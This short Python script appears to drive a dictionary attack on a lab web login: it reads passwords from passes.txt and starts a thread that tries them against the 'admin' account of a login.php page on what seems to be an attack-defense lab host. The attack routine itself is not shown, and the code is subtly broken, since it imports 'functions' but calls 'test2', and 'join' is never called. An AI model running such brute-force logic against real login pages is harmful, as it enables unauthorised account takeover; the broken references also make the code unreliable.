import functions,threading


file=open("passes.txt","r",encoding="utf-8")
passwords=file.read().splitlines()
t1=threading.Thread(target=test2.threadTarget,args=("https://9vjjyqrhbqnss19h11y8lp0ux.eu-central-4.attackdefensecloudlabs.com/login.php","admin",passwords,0,passwords.__len__()))
t1.start()
t1.join



 
